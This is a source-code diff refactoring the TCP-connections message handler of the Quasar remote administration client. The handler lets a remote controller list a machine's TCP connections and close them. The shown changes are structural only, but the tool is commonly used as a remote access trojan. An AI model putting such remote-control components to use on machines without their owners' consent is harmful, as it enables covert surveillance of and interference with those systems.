@@ -1,5 +1,4 @@
-﻿using Quasar.Client.Networking;
-using Quasar.Client.Utilities;
+﻿using Quasar.Client.Utilities;
 using Quasar.Common.Enums;
 using Quasar.Common.Messages;
 using Quasar.Common.Models;
@@ -9,21 +8,14 @@ using System.Runtime.InteropServices;
 
 namespace Quasar.Client.Messages
 {
-    public class TcpConnectionsHandler : MessageProcessorBase<object>
+    public class TcpConnectionsHandler : IMessageProcessor
     {
-        private readonly QuasarClient _client;
+        public bool CanExecute(IMessage message) => message is GetConnections ||
+                                                    message is DoCloseConnection;
 
-        public TcpConnectionsHandler(QuasarClient client) : base(false)
-        {
-            _client = client;
-        }
+        public bool CanExecuteFrom(ISender sender) => true;
 
-        public override bool CanExecute(IMessage message) => message is GetConnections ||
-                                                             message is DoCloseConnection;
-
-        public override bool CanExecuteFrom(ISender sender) => true;
-
-        public override void Execute(ISender sender, IMessage message)
+        public void Execute(ISender sender, IMessage message)
         {
             switch (message)
             {
@@ -120,7 +112,16 @@ namespace Quasar.Client.Messages
             return tTable;
         }
 
-        protected override void Dispose(bool disposing)
+        /// <summary>
+        /// Disposes all managed and unmanaged resources associated with this message processor.
+        /// </summary>
+        public void Dispose()
+        {
+            Dispose(true);
+            GC.SuppressFinalize(this);
+        }
+
+        protected virtual void Dispose(bool disposing)
         {
             
         }
